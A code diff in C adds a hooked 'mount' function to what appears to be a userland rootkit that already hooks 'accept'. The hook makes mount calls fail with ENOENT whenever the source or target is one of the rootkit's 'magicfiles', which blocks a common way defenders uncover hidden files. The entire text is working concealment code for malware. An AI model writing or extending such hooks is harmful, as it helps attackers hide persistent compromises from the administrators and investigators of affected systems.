@@ -354,3 +354,27 @@ int accept(int socket, struct sockaddr_in *address, socklen_t *address_len){
     }
     return fd;
 }
+
+/*
+ * Function:  mount
+ * --------------------
+ * mount hijacking
+ * if source or destination are one of the magicfiles it just returns 'ENOENT' (-1)
+ * prevents some mount tricks.
+ */
+int mount(const char *source, const char *target,
+          const char *filesystemtype, unsigned long mountflags,
+          const void *data){
+    
+    char realsource[PATH_MAX], realtarget[PATH_MAX];
+    realpath(source, realsource);
+    realpath(target, realtarget);
+    if (is_magicfile(realsource) ||  is_magicfile(realtarget)){
+        errno = ENOENT;
+        return -1;
+    }
+    if (!hooked_mount){
+        hooked_mount = load_libc("mount");
+    }
+    return hooked_mount(source, target, filesystemtype, mountflags, data);
+}
